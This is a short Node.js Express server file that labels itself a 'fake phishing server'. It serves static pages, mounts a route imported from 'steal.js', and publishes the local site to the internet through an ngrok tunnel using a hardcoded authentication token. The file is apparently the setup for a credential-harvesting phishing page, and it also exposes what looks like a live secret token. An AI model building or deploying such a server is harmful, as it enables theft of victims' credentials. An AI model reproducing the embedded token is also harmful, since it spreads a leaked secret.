import express from "express";
import path from "path";
import bodyParser from "body-parser";
import { fileURLToPath } from "url";
import { dirname } from "path";
import stealRoute from "./api/steal.js";
import ngrok from 'ngrok';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
const PORT = 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));
app.use("/api", stealRoute);

app.listen(PORT, () => {
  console.log(`🚨 Fake phishing server running at http://localhost:${PORT}`);
});
const startTunnel = async () => {
  try {
    const url = await ngrok.connect({
      addr: PORT, // Replace with your local server port
      authtoken: '2xdDtiQ7hTViC1UXZlDWmnGB2UC_6UpPhkhECU8mJxVSMM6Er', // Optional if you want custom domains or regions
      region: 'us', // Optional (us, eu, ap, etc.)
    });

    console.log(`Tunnel started at: ${url}`);
  } catch (error) {
    console.error('Error starting ngrok tunnel:', error);
  }
};

startTunnel();